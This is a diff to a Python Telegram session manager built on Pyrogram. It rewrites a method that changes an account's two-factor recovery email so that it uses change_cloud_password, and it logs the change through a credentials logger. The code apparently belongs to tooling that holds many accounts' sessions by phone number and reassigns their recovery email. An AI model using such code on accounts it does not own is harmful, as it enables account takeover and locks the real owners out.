@@ -484,8 +484,8 @@ class PyrogramSessionManager:
     
     async def change_recovery_email(self, phone: str, current_password: str, new_email: str) -> Dict[str, Any]:
         """
-        Change the 2FA recovery email to a new email address
-        This is used instead of removing the email (which Telegram no longer supports)
+        Change the 2FA recovery email to a new email address using high-level API
+        Uses change_cloud_password with same password but new email
         """
         start_time = time.time()
         logger.info(f"Changing recovery email for {phone} to {new_email}")
@@ -495,44 +495,22 @@ class PyrogramSessionManager:
             return {"status": "error", "error": "Session not found."}
         
         try:
-            from pyrogram.raw import types
-            from pyrogram.crypto import compute_password_check
-            
-            # Get current password settings
-            password_info = await client.invoke(functions.account.GetPassword())
-            
-            if not password_info.has_password:
-                return {"status": "error", "error": "No 2FA password set. Cannot change recovery email."}
-            
-            # Compute password hash
-            password_check = compute_password_check(password_info, current_password)
-            
-            # Create new settings with updated email
-            new_settings = types.account.PasswordInputSettings(
-                email=new_email,
-                new_algo=password_info.new_algo,
-                new_password_hash=b'',  # Empty to keep current password
-                hint=password_info.hint or ''
-            )
-            
-            # Update password settings
-            result = await client.invoke(
-                functions.account.UpdatePasswordSettings(
-                    password=password_check,
-                    new_settings=new_settings
-                )
+            await client.change_cloud_password(
+                current_password=current_password,
+                new_password=current_password,
+                new_hint="",
+                email=new_email
             )
             
             duration = time.time() - start_time
             logger.info(f"Recovery email change initiated for {phone} to {new_email} (duration: {duration:.2f}s)")
             
-            # Log to credentials file
             from backend.core_engine.credentials_logger import log_credentials
             log_credentials(
                 phone=phone,
                 action="EMAIL_CHANGE_INITIATED",
                 email=new_email,
-                extra_data={"result": str(result)}
+                extra_data={}
             )
             
             return {
